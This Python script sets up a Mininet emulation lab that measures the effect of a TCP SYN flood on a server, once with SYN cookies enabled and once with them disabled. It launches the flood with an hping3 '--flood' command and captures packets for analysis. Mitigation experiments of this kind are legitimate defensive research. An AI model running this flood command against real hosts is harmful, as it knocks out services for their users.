from mininet.net import Mininet
from mininet.topo import Topo
from mininet.node import Controller
from mininet.log import setLogLevel
from mininet.cli import CLI
import time
import sys

class SimpleTopo(Topo):
    """Simple topology with two hosts and a switch"""
    def build(self):
        h1 = self.addHost('h1')  # Attacker/Client
        h2 = self.addHost('h2')  # Server
        s1 = self.addSwitch('s1')
        
        self.addLink(h1, s1)
        self.addLink(h2, s1)

def configure_kernel_params(host, mitigate_flag):
    """Configure kernel parameters for SYN flood attack or mitigation"""
    print("[*] Configuring kernel parameters on", host.name)
    
    # Increase SYN backlog
    host.cmd("sysctl -w net.ipv4.tcp_max_syn_backlog=4096")

    if mitigate_flag:
        print("[*] Applying SYN flood mitigation on", host.name)
        host.cmd("sysctl -w net.ipv4.tcp_syncookies=1")  # Enable SYN cookies
        host.cmd("sysctl -w net.ipv4.tcp_synack_retries=5")  # Increase retries
    else:
        print("[*] Disabling SYN flood mitigation on", host.name)
        host.cmd("sysctl -w net.ipv4.tcp_syncookies=0")  # Disable SYN cookies
        host.cmd("sysctl -w net.ipv4.tcp_synack_retries=1")  # Reduce retries

def run_experiment(filename, mitigate_flag):
    """Sets up Mininet, configures TCP settings, runs attack and logs results"""
    setLogLevel('info')
    net = Mininet(topo=SimpleTopo(), controller=Controller)
    
    net.start()
    
    h1 = net.get('h1')  # Attacker/Client
    h2 = net.get('h2')  # Server
    
    # Configure kernel parameters
    configure_kernel_params(h2, mitigate_flag)
    
    # Start server on h2
    print("[*] Starting TCP Server on h2")
    h2.cmd("python3 server.py &")  # Run server in background
    
    time.sleep(2)  # Allow server to start
    
    # Start packet capture on h1
    print("[*] Starting packet capture on h1")
    h1.cmd(f"tcpdump -i h1-eth0 -w {filename} &")  

    # Start legitimate traffic from h1
    print("[*] Starting legitimate traffic")
    h1.cmd(f"python3 legitimate.py {h2.IP()} &")

    time.sleep(20)  # Wait before attack

    # Start SYN flood attack
    print("[*] Launching SYN Flood attack!")
    h1.cmd(f"hping3 -S -p 8080 --flood {h2.IP()} &")

    time.sleep(100)  # Attack duration

    # Stop attack
    print("[*] Stopping SYN Flood attack")
    h1.cmd("kill %hping3")

    time.sleep(20)  # Allow legitimate traffic to continue

    # Stop legitimate traffic
    print("[*] Stopping legitimate traffic")
    h1.cmd("kill %python3")

    # Stop packet capture
    print("[*] Stopping packet capture")
    h1.cmd("kill %tcpdump")

    # Stop server
    print("[*] Stopping server")
    h2.cmd("kill %python3")

    net.stop()
    print("[*] Experiment complete. PCAP saved as", filename)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 main.py <pcap_filename> <mitigate_flag: 0 or 1>")
        sys.exit(1)

    filename = sys.argv[1]
    mitigate_flag = bool(int(sys.argv[2]))

    run_experiment(filename, mitigate_flag)
